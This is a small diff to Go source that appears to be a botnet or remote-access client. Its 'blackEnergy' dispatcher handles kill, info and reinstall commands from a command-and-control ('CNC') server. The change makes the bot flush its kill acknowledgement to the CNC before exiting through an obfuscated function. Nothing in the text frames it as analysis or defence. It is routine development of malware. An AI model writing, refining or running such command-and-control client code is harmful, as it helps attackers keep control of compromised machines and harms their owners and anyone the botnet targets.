@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 )
 
 // blackEnergy is the main command dispatcher.
@@ -71,6 +72,9 @@ func blackEnergy(conn net.Conn, command string) error {
 		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
 	case "!kill":
 		conn.Write([]byte(msgKillAck))
+		// Brief pause so the kernel flushes the ack to the CNC before we exit
+		time.Sleep(100 * time.Millisecond)
+		conn.Close()
 		rZbQfGv()
 	case "!info":
 		hostname, _ := os.Hostname()
